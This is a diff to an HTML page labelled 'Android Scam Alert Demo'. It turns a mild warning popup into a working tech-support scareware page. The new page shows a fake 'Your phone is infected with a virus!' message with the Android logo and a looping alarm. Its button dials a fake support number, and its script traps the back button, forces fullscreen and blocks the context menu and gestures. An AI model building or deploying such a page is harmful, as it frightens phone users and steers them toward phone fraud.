@@ -3,79 +3,112 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Android Scam Warning Demo</title>
+<title>Android Scam Alert Demo</title>
 <style>
   html, body {
     margin: 0; padding: 0;
     height: 100%; width: 100%;
-    background: black;
-    color: white;
-    font-family: 'Roboto', sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    user-select: none;
+    background: #212121;
+    font-family: Arial, sans-serif;
     overflow: hidden;
+    user-select: none;
   }
-  #popup {
-    background: #d32f2f;
-    padding: 30px;
-    border-radius: 15px;
-    max-width: 350px;
+  #overlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: #b71c1c;
+    color: white;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
     text-align: center;
-    box-shadow: 0 0 15px #ff5252;
+    z-index: 9999;
   }
-  #popup h1 {
-    margin: 0 0 15px;
-    font-size: 28px;
-    font-weight: 700;
-  }
-  #popup p {
-    font-size: 16px;
+  #android-logo {
+    width: 80px;
     margin-bottom: 20px;
   }
-  #popup button {
-    background: #b71c1c;
-    border: none;
-    color: white;
-    font-size: 18px;
-    padding: 10px 20px;
-    border-radius: 8px;
-    cursor: pointer;
+  h1 {
+    font-size: 30px;
+    margin-bottom: 10px;
   }
-  #popup button:hover {
-    background: #f44336;
+  p {
+    font-size: 18px;
+    margin-bottom: 30px;
+  }
+  button {
+    background: #388e3c;
+    border: none;
+    padding: 15px 30px;
+    border-radius: 10px;
+    font-size: 20px;
+    color: white;
+    cursor: pointer;
+    user-select: none;
+  }
+  button:active {
+    background: #2e7d32;
   }
 </style>
 </head>
 <body>
 
-<div id="popup">
-  <h1>⚠️ SCAM ALERT ⚠️</h1>
-  <p>A suspicious charge was detected on your account. Do not share your info.<br />
-     Call official support immediately.</p>
+<div id="overlay" role="alert" aria-live="assertive" aria-atomic="true">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" alt="Android Logo" id="android-logo" />
+  <h1>⚠️ WARNING ⚠️</h1>
+  <p>Your phone is infected with a virus!<br/>Call support immediately!</p>
   <button onclick="callSupport()">Call Support: 888-888-8888</button>
 </div>
 
-<script>
-  // Request fullscreen on page load (must be triggered by user interaction on most browsers)
-  document.documentElement.requestFullscreen().catch(() => {});
+<audio id="alertSound" src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" preload="auto"></audio>
 
-  // Prevent back button normal press
+<script>
+  // Play alert sound repeatedly
+  const alertSound = document.getElementById('alertSound');
+  function playAlert() {
+    alertSound.play().catch(() => {});
+  }
+  alertSound.addEventListener('ended', () => {
+    setTimeout(() => {
+      playAlert();
+    }, 1000);
+  });
+
+  playAlert();
+
+  // Prevent back button navigation by pushing history state
   history.pushState(null, null, location.href);
   window.onpopstate = function () {
     history.pushState(null, null, location.href);
-    alert("Please do not go back! This is a scam warning.");
+    alert("Back navigation disabled! Please use Home button.");
   };
 
-  // Call support function - opens dialer
+  // Call dialer function
   function callSupport() {
     window.location.href = "tel:8888888888";
   }
 
-  // Note:
-  // User can long press back button to exit fullscreen.
-  // This behavior cannot be prevented by JS for security reasons.
+  // Request fullscreen on user gesture (click anywhere on screen)
+  function goFullscreen() {
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen();
+    } else if (document.documentElement.webkitRequestFullscreen) { /* Safari */
+      document.documentElement.webkitRequestFullscreen();
+    }
+  }
+
+  // Optional: on overlay click go fullscreen
+  document.getElementById('overlay').addEventListener('click', () => {
+    goFullscreen();
+  });
+
+  // Try to block context menu and long press
+  window.addEventListener('contextmenu', e => e.preventDefault());
+  window.addEventListener('touchstart', e => {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
 </script>
 
 </body>
